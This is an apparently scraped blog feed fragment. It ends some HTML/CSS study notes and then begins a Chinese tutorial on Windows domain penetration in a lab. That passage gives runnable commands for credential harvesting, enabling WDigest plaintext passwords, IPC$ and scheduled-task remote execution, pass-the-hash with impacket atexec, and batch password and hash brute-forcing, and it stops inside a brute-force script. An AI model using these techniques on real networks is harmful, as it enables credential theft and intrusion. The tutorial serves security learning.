alt="image-20220325211849732"></p><p><strong>2、在外部再引用外部</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212537499.png" alt="image-20220325212537499"></p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325212557848.png" alt="image-20220325212557848" style="zoom:50%;"><h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><pre><code class="html">&lt;div style=&quot;color: blue;width: 100px;height: 100px; background: black;&quot;&gt;demo2&lt;/div&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325213538813.png" alt="image-20220325213538813"></p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre><code class="html">/* */ 注释内容</code></pre><h2 id="样式选择器"><a href="#样式选择器" class="headerlink" title="样式选择器"></a>样式选择器</h2><pre><code class="html">元素选择器   div&#123;属性:值&#125;ID选择器  #id&#123;属性:值&#125;class选择器  .类名&#123;属性:值&#125;子选择器    元数 空格 元素&#123;属性:值&#125;后代选择器  元数 &gt; 元数&#123;属性:值&#125;属性选择器  元素[属性]&#123;&#125;通配符选择器  *&#123;属性:值&#125;群组选择器  把相同的元素写在一起</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220117278.png" alt="image-20220325220117278"></p><p><strong>通配符选择器示意</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325220708388.png" alt="image-20220325220708388"></p><p><strong>群组选择器</strong></p><p>把相同的元素写在一起，减少重复代码</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325221110722.png" alt="image-20220325221110722"></p><p><strong>子选择器/后代选择器</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325222155359.png" alt="image-20220325222155359"></p><h2 id="背景和边框"><a href="#背景和边框" class="headerlink" title="背景和边框"></a>背景和边框</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>background-color   规定要使用的背景颜色。</p><p>background-position    规定背景图像的位置。    </p><p>background-size     规定背景图片的尺寸。    </p><p>background-repeat  规定如何重复背景图像。  </p><pre><code>repeat  默认。背景图像将在垂直方向和水平方向重复。repeat-x 背景图像将在水平方向重复。repeat-y 背景图像将在垂直方向重复。no-repeat   背景图像将仅显示一次。inherit  规定应该从父元素继承 background-repeat 属性的设置。</code></pre><p>background-origin  规定背景图片的定位区域。    </p><p>background-clip     规定背景的绘制区域。    </p><p>background-attachment  规定背景图像是否固定或者随着页面的其余部分滚动。    </p><pre><code class="html">背景图片的滚动背景图片是否随着内容的滚动而滚动由background-attachment设置background-attachment:fixed; 固定，不随内容的滚动而滚动background-attachment:scroll; 滚动，随内容的滚动而滚动</code></pre><p>background-image  规定要使用的背景图像。</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224711431.png" alt="image-20220325224711431"></p><p>上述body可直接简写为</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325224906687.png" alt="image-20220325224906687"></p><p>inherit  规定应该从父元素继承 background 属性的设置。  </p><p>left top</p><p>left center</p><p>left bottom</p><p>right top</p><p>right center</p><p>right bottom</p><p>center top</p><p>center center</p><p>center bottom</p><h3 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h3><p>边框颜色 border-color:#000</p><p>边框宽度 border-width:1px;</p><p>border-left 设置左边框，一般单独设置左边框样式使用</p><p>border-right 设置右边框，一般单独设置右边框样式使用</p><p>border-top 设置上边框，一般单独设置上边框样式使用</p><p>border-bottom 设置下边框，一般单独设置下边框样式使用,有时可将下边框样式作为css下划线效果应用。</p><p><strong>边框样式值如下：</strong></p><p>none : 　无边框。与任何指定的border-width值无关</p><p>hidden : 　隐藏边框。IE不支持</p><p>dotted : 　在MAC平台上IE4+与WINDOWS和UNIX平台上IE5.5+为点线。否则为实线（常用）</p><p>dashed : 　在MAC平台上IE4+与WINDOWS和UNIX平台上IE5.5+为虚线。否则为实线（常用）</p><p>solid : 　实线边框（常用）</p><p>double : 　双线边框。两条单线与其间隔的和等于指定的border-width值</p><p><strong>上 右 下左：</strong></p><p>groove : 　根据border-color的值画3D凹槽</p><p>ridge : 　根据border-color的值画菱形边框</p><p>inset : 　根据border-color的值画3D凹边</p><p>outset : 　根据border-color的值画3D凸边</p><p><strong>上 右 下左 简写：</strong></p><p>border:5px solid red;</p><p> <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325231755509.png" alt="image-20220325231755509"></p><h2 id="文字属性"><a href="#文字属性" class="headerlink" title="文字属性"></a>文字属性</h2><p>color:red; 文字颜色 #ffeeees</p><p>font-size:12px; 文字大小</p><p>font-weight:bolds 文字粗细(bold/normal)</p><p>font-family:”宋体”文字字体</p><p>font-variant:small-caps小写字母以大写字母显示</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326001639314.png" alt="image-20220326001639314"></p><h2 id="文本属性-1"><a href="#文本属性-1" class="headerlink" title="文本属性"></a>文本属性</h2><p>text-align:center; 文本对齐(right/left/center)</p><p>line-height:10px; 行间距(可通过它实现文本的垂直居中)</p><p>text-indent:20px; 首行缩进</p><p>text-decoration:none;</p><p>文本线(none/underline/overline/line-through) underline/overline/line-through; 定义文本上的下划线/上划线/中划线</p><p>letter-spacing: 字间距</p><p>文本域示例:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326004753645.png" alt="image-20220326004753645"></p><h2 id="列表-1"><a href="#列表-1" class="headerlink" title="列表"></a>列表</h2><p>list-style-type   设置列表项标记的类型。参阅：list-style-type 中可能的值。</p><p>list-style-image 使用图像来替换列表项的标记。参阅：list-style-image 中可能的值。</p><p>inherit  规定应该从父元素继承 list-style 属性的值</p><pre><code>取值:​    disc: 点​    circle: 圆圈​    square: 正方形​    decimal: 数字​    decimal-leading-zero: 十进制数，不足两位的补齐前导0，例如: 01, 02, 03, ..., 98, 99​    lower-roman: 小写罗马文字，例如: i, ii, iii, iv, v, ...​    upper-roman: 大写罗马文字，例如: I, II, III, IV, V, ...​    lower-greek: 小写希腊字母，例如: α(alpha), β(beta), γ(gamma), ...​    lower-latin: 小写拉丁文，例如: a, b, c, ... z​    upper-latin: 大写拉丁文，例如: A, B, C, ... Z​    armenian: 亚美尼亚数字​    georgian: 乔治亚数字，例如: an, ban, gan, ..., he, tan, in, in-an, ...​    lower-alpha: 小写拉丁文，例如: a, b, c, ... z​    upper-alpha: 大写拉丁文，例如: A, B, C, ... Z​    none: 无(取消所有的list样式)​    inherit:继承</code></pre><p>list-style-position   设置在何处放置列表项标记。参阅：list-style-position 中可能的值。</p><pre><code>inside列表项目标记放置在文本以内，且环绕文本根据标记对齐。outside默认值。保持标记位于文本的左侧。列表项目标记放置在文本以外，且环绕文本不根据标记对齐。简写list-style:square inside url(&#39;/i/arrow.gif&#39;);</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326011302577.png" alt="image-20220326011302577"></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><pre><code>a&#123;text-decoration: none;&#125;a:link &#123;color:#FF0000;&#125; /* 未访问的链接 */a:visited &#123;color:#00FF00;&#125; /* 已访问的链接 */a:hover &#123;color:#FF00FF;&#125; /* 鼠标划过链接 */a:active &#123;color:#0000FF;&#125; /* 已选中的链接 */</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326012956179.png" alt="image-20220326012956179"></p><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326171556178.png" alt="image-20220326171556178"></p><p>盒子模型的组成部分：</p><p>外边距（margin）、边框（border）、内边距（padding）、内容（content）四个属性</p><p>自身的身高:width height </p><p>内边距: padding</p><p>盒子边框:border</p><p>与其他盒子的距离 margin 外边距</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326172438006.png" alt="image-20220326172438006"></p><h2 id="border边框"><a href="#border边框" class="headerlink" title="border边框"></a>border边框</h2><p>常见的写法 border:1px solid #foo;</p><p>单独属性:</p><p>border-widh:</p><p>border-style:</p><pre><code>dotted 点状虚线dashed（虚线）solid（实线）double（双实线）border-color(颜色)</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326173422032.png" alt="image-20220326173422032"></p><h2 id="margin-padding"><a href="#margin-padding" class="headerlink" title="margin padding"></a>margin padding</h2><p>padding:内边距</p><p>值：像素/厘米等长度单位、百分比</p><p>padding:10px; 上下左右</p><p>padding:10px 10px; 上下 左右</p><p>padding:10px 10px 10px; 上 左右 下</p><p>padding:10px 10px 10px 10px; 上 右 下 左（设置4个点–&gt;顺时针方向）</p><p>单独属性</p><p>padding-top:</p><p>padding-right:</p><p>padding-bottom:</p><p>padding-left:</p><p>当设置内边距的时候会把盒子撑大，为了保持盒子原来的大小，应该高度和宽度进行减小，根据width和height减小</p><p>margin 外边距值：与padding相同</p><p> 单独属性：与padding相同 </p><p>外边距合并：两个盒子同时设置了外边距，会进行一个外边距合并 </p><p>margin</p><p>margin:10px 上下左右都会腾出10px出来</p><p>margin:0px auto; 居中</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326175233023.png" alt="image-20220326175233023"></p><p><strong>让div和内容居中</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326180736898.png" alt="image-20220326180736898"></p><h2 id="float-脱离文档流浮动"><a href="#float-脱离文档流浮动" class="headerlink" title="float 脱离文档流浮动"></a>float 脱离文档流浮动</h2><p>left 元素向左浮动。</p><p>right 元素向右浮动</p><p>清除浮动:</p><pre><code>clear: both;leftright</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326210210962.png" alt="image-20220326210210962"></p><h2 id="块级元素行内元素"><a href="#块级元素行内元素" class="headerlink" title="块级元素行内元素"></a>块级元素行内元素</h2><p><strong>块级元素</strong></p><p>他会独占一行，在默认情况下，其宽度自动填满其父元素的宽度；</p><p>块级元素可以设置width、height属性；</p><p>块级元素即使设置了宽度也是独占一行，块级元素可以设置margin、padding属性</p><p><strong>行内元素</strong></p><p>行内元素不会独占一行，相邻的行内元素会排列在同一行里，直到行排不下，就自动换行，其宽度随内容而变化；</p><p>行内元素的width、height属性则无效；</p><p>行内元素的margin、padding属性很奇怪，水平方向的padding-left、padding-rigtht、margin-left、padding-right都会产生边距效果，但是竖直方向的padding-top、padding-bottom、margin-top、margin-bottom却不产生边距效果。</p><p><strong>块级元素(block element)</strong></p><pre><code>address 地址center 举中对齐块div- 常用块级容易dl 定义列表form 交互表单 （只能用来容纳其它块元素）h标签hr 水平分隔线ol 无需列表ul有序列表p 段落pre 格式化文本</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326211940013.png" alt="image-20220326211940013"></p><p><strong>行内元素转换</strong></p><pre><code>display:none; 不显示display:block;变成块级元素display:inline; 变成行内元素display:inline-block;以块级元素样式展示，以行级元素样式排列</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326212608009.png" alt="image-20220326212608009"></p><p>两个块级元素此时在同一行了</p><p><strong>行内元素溢出处理</strong></p><pre><code>overflow 属性规定当内容溢出元素框时发生的事情：visible    默认值。内容不会被修剪，会呈现在元素框之外。hidden    内容会被修剪，并且其余内容是不可见的。scroll    内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。auto    如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。inherit    规定应该从父元素继承 overflow 属性的值。</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214145022.png" alt="image-20220326214145022"></p><p>我们可以看到此时元素超出的边框</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214302027.png" alt="image-20220326214302027"></p><p>添加overflow后会增加一个拖动条</p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><pre><code>positionstatic静态定位（不对它的位置进行改变，在哪里就在那里）默认值。没有定位，元素出现在正常的流中（忽略 top,bottom, left, right 或者z-index 声明）。fixed固定定位（参照物--浏览器窗口）---做 弹窗广告用到生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot;以及 &quot;bottom&quot;属性进行规定。relative（相对定位 ）（参照物以他本身）生成相对定位的元素，相对于其正常位置进行定位。absolute（绝对定位）(除了static都可以，找到参照物--&gt;与它最近的已经有定位的父元素进行定位)生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot; 以及 &quot;bottom&quot; 属性进行规定z-indexz-index 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220327005012845.png" alt="image-20220327005012845"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;简单的HTML页面架构&quot;&gt;&lt;a href=&quot;#简单的HTML页面架构&quot; class=&quot;headerlink&quot; title=&quot;简单的HTML页面架构&quot;&gt;&lt;/a&gt;简单的HTML页面架构&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;</summary>
      
    
    
    
    <category term="语言" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/"/>
    
    <category term="html" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/html/"/>
    
    
    <category term="html" scheme="https://sakurahack-y.github.io/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透篇</title>
    <link href="https://sakurahack-y.github.io/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/"/>
    <id>https://sakurahack-y.github.io/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/</id>
    <published>2022-03-18T06:56:01.000Z</published>
    <updated>2022-03-31T16:30:08.477Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="域的搭建"><a href="#域的搭建" class="headerlink" title="域的搭建"></a>域的搭建</h1><p>实验环境:</p><p>win2008 域控       本地管理员密码:0801.com  域密码:yk2008.com    ip:192.168.137.2     </p><p>win 2008 域成员  本地管理员密码:0802.com  域密码:yc2008.com    ip:192.168.137.66</p><p>win 2003 域成员  本地管理员密码:0301.com  域密码: yc2003.com    ip:192.168.137.99</p><p><strong>配置域控2008</strong></p><p>使用vm1网卡</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141739390.png" alt="image-20220322141739390"></p><p>配置ip</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141649714.png" alt="image-20220322141649714"></p><p>找到服务器管理器</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135655066.png" alt="image-20220322135655066"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135624657.png" alt="image-20220322135624657"></p><p>一直下一步，然后安装</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140010325.png" alt="image-20220322140010325"></p><p>安装成功</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140057795.png" alt="image-20220322140057795"></p><p>运行dcpromo程序:</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141947512.png" alt="image-20220322141947512"></p><p>一直下一步，到这里新建域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142110877.png" alt="image-20220322142110877"></p><p>命名林根域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142158498.png" alt="image-20220322142158498"></p><p>选择2008 R2</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142302851.png" alt="image-20220322142302851"></p><p>一直下一步/默认是，到这一步设置密码为:yk2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142632261.png" alt="image-20220322142632261"></p><p>一直下一步</p><p>完成了域控的配置，并重启</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142812609.png" alt="image-20220322142812609"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142833978.png" alt="image-20220322142833978"></p><p>重启后，有域的标识出现，我们使用前文设置的域控密码登录</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322143248873.png" alt="image-20220322143248873"></p><p>进入后</p><p>打开域管理中心</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322150310596.png" alt="image-20220322150310596"></p><p>打开用户和计算机，新建组织hack</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151545759.png" alt="image-20220322151545759"></p><p>在这个组分别建立server2003用户和server2008用户，设置域密码分别为 yc2003.com和yc2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151809690.png" alt="image-20220322151809690"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151918916.png" alt="image-20220322151918916"></p><p>到这里域控的配置就完成了，接下来就让域成员加入域</p><p>进入windows2003</p><p>更改计算机名加入域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322153432998.png" alt="image-20220322153432998"></p><p>windows2008同理</p><p>然后重启</p><p>输入加入域的计算机名</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154303764.png" alt="image-20220322154303764"></p><p>成功登入</p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154329618.png" alt="image-20220322154329618" style="zoom:50%;"><p>我们在域控中就能看到两台计算机上线</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154709810.png" alt="image-20220322154709810"></p><p>域环境就搭建好了</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><strong>基本信息收集：</strong></p><p>了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备</p><pre><code>systeminfo 详细信息net start 启动服务tasklist 进程列表schtasks 计划任务</code></pre><p><strong>网络信息收集:</strong></p><p>了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p><pre><code>ipconfig /all 判断存在域-dnsnet view /domain 判断存在域net time /domain 判断主域netstat -ano 当前网络端口开放nslookup 域名 追踪来源地址</code></pre><p><strong>用户信息收集:</strong></p><p>了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试</p><pre><code>Domain Admins：域管理员（默认对域控制器有完全控制权）Domain Computers：域内机器Domain Controllers：域控制器Domain Guest：域访客，权限低Domain Users：域用户Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）相关用户收集操作命令：whoami /all 用户权限net config workstation 登录信息net user 本地用户net localgroup 本地用户组net user /domain 获取域用户信息net group /domain 获取域用户组信息wmic useraccount get /all 涉及域用户详细信息net group &quot;Domain Admins&quot; /domain 查询域管理员账户net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组net group &quot;Domain Controllers&quot; /domain 查询域控制器</code></pre><p><strong>凭据信息收集操作:</strong></p><p>收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p><pre><code>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)Netsh WLAN show profilesNetsh WLAN show profile name=&quot;无线名称&quot; key=clear1.站点源码备份文件、数据库备份文件等2.各类数据库 Web 管理入口，如 PHPMyAdmin3.浏览器保存密码、浏览器 Cookies4.其他用户会话、3389 和 ipc$连接记录、回收站内容5.Windows 保存的 WIFI 密码6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等</code></pre><p><strong>探针主机域控架构服务:</strong></p><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p><pre><code>探针域控制器名及地址信息net time /domain nslookup ping探针域内存活主机及地址信息nbtscan 192.168.3.0/24 第三方工具for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot; 自带内部命令nmap masscan 第三方 PowerShell 脚本 nishang empire 等#导入模块 nishangImport-Module .\nishang.psm1#设置执行策略Set-ExecutionPolicy RemoteSigned#获取模块 nishang 的命令函数Get-Command -Module nishang#获取常规计算机信息Get-Information#端口扫描（查看目录对应文件有演示语法，其他同理）Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort#其他功能：删除补丁，反弹 Shell，凭据获取等探针域内主机角色及服务信息利用开放端口服务及计算机名判断核心业务机器:1.高级管理人员、系统管理员、财务/人事/业务人员的个人计算机2.产品管理系统服务器3.办公系统服务器4.财务应用系统服务器5.核心产品源码服务器（自建 SVN、GIT）6.数据库服务器7.文件或网盘服务器、共享服务器8.电子邮件服务器9.网络监控系统服务器10.其他服务器（内部技术文档服务器、其他监控服务器等）</code></pre><h1 id="域横向"><a href="#域横向" class="headerlink" title="域横向"></a>域横向</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/1b22fbb60e7aa3f167c08e67c61e025e73769fd3.png@942w_611h_progressive.webp" alt="img"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320150741924.png" alt="image-20220320150741924"></p><h2 id="域横向必备知识点"><a href="#域横向必备知识点" class="headerlink" title="域横向必备知识点"></a><strong>域横向必备知识点</strong></h2><p><strong>知识点1：</strong><br>Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码<br>Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</p><pre><code>针对以上情况，我们提供了4种方式解决此类问题1.利用哈希 hash 传递(pth，ptk等)进行移动2.利用其它服务协议(SMB,WMI等)进行哈希移动3.利用注册表操作开启Wdigest Auth值进行获取4.利用工具或第三方平台(Hachcat)进行破解获取</code></pre><pre><code>#注册表操作开启Wdigest Auth值reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p><strong>知识点2：</strong><br>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p><pre><code>#获取win密码hash的两个工具Pwdump7QuarksPwdump</code></pre><p><strong>知识点3：</strong><br>域用户与本地用户的区别<br>比如，<code>god/administrator</code>是域用户，<code>./administrator</code>是本地用户</p><h2 id="at-amp-amp-schtasks-密码是明文"><a href="#at-amp-amp-schtasks-密码是明文" class="headerlink" title="at&amp;&amp;schtasks(密码是明文)"></a><strong>at&amp;&amp;schtasks(密码是明文)</strong></h2><p><strong>优点:官方自带命令，不会被杀</strong></p><p><strong>缺点:命令比较繁琐，且只支持明文密码</strong></p><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？ 这里介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主 机上执行命令</p><p>获取到某域主机权限–&gt;minikatz 得到密码（明文，hash）–&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典–&gt;尝试连接–&gt;创建计划任务(at|schtasks)–&gt;执行文件可为后门或者相关命令</p><p>利用流程:</p><ol><li>建立 IPC 链接到目标主机 (目标主机要开启135，445)</li><li> 拷贝要执行的命令脚本到目标主机 </li><li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本 </li><li> 删除 IPC 链接 </li></ol><pre><code>net use \\server\ipc$&quot;password&quot; /user:username # 工作组 net use \\server\ipc$&quot;password&quot; /user:domain\username #域内 dir \\xx.xx.xx.xx\C$\ # 查看文件列表 copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件 copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件 net use \\xx.xx.xx.xx\C$\1.bat /del # 删除 IPC net view xx.xx.xx.xx # 查看对方共享 #建立 IPC 常见的错误代码 （1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 （2）51：网络问题，Windows 无法找到网络路径 （3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题 （4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$ （5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除 （6）1326：账号密码错误 （7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况 （8）2242：用户密码过期，目标有账号策略，强制定期更改密码 #建立 IPC 失败的原因 （1）目标系统不是 NT 或以上的操作系统 （2）对方没有打开 IPC$共享 （3）对方未开启 139、445 端口，或者被防火墙屏蔽 （4）输出命令、账号密码有错误</code></pre><pre><code>[at] &amp; [schtasks]#at &lt; Windows2012net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立 ipc 连接：copy add.bat \\192.168.3.21\c$ #拷贝执行文件到目标机器at \\192.168.3.21 15:47 c:\add.bat #添加计划任务#schtasks &gt;=Windows2012net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # 建立 ipc 连接：copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务对应执行文件schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务</code></pre><h2 id="atexec-impacket-明文和HASH-传递攻击"><a href="#atexec-impacket-明文和HASH-传递攻击" class="headerlink" title="atexec-impacket 明文和HASH 传递攻击"></a><strong>atexec-impacket 明文和HASH 传递攻击</strong></h2><p><strong>impacket的exe版本:<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></strong></p><p><strong>优点:命令简单，易上手</strong></p><p><strong>缺点:非官方自带，可能被杀</strong></p><pre><code>atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320153845240.png" alt="image-20220320153845240"></p><p><strong>明文 HASH 传递批量利用</strong></p><p>收集活跃ip，放在ip.txt中</p><pre><code>FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #批量检测 IP 对应明文连接FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测 IP 对应明文回显版</code></pre><p>收集可能的密码和hash放在文件中</p><pre><code>FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应 IP回显版FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测 HASH 对应 IP 回显版</code></pre><p><strong>明文HASH传递批量利用-升级版</strong></p><p>利用py脚本制作的exe文件批量尝试横向渗透</p><p>Fuck.py</p><pre><code class="python">import osimport timeips=&#123;    &#39;192.168.3.30&#39;,    &#39;192.168.3.25&#39;,    &#39;192.168.3.32&#39;,    &#39;192.168.3.29&#39;&#125;users=&#123;    &#39;admin&#39;,    &#39;user&#39;,    &#39;Administrator&#39;,    &#39;webadmin&#39;,    